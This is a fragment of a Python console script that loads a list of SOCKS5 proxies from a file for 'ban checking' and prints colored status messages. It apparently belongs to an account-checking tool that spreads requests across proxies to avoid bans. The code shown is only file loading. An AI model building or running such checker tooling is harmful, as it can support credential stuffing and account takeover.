        print(f'{Fore.LIGHTRED_EX}Error reading proxy file: {str(e)}{Fore.RESET}')
        proxytype = "'4'"
        time.sleep(2)
def banproxyload():
    global banproxies
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f'{Fore.YELLOW}Load Ban Checking Proxy File (SOCKS5)')
    print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}")
    filename = None
    default_file = 'banproxies.txt'
    if os.path.exists(default_file):
        print(f'{Fore.GREEN}Found {default_file} in current directory!{Fore.RESET}')
        try:
            use_default = input(f'{Fore.YELLOW}Use this file? (Y/n): {Fore.RESET}').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        try:
            filename = input(f'{Fore.CYAN}Load Ban Proxy: {Fore.RESET}').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"{Fore.LIGHTRED_EX}Invalid file path or file doesn't exist.{Fore.RESET}")
        print(f'{Fore.YELLOW}Continuing without ban checking proxies...{Fore.RESET}')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            banproxies = [line.strip() for line in f if line.strip()]
        print(f'{Fore.LIGHTBLUE_EX}[{len(banproxies)}] Ban Check Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(banproxies)} SOCKS5 proxies loaded for ban checking')
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error reading ban proxy file: {str(e)}{Fore.RESET}')
        time.sleep(2)
def main():
    Main()
if __name__ == '__main__':
    main()
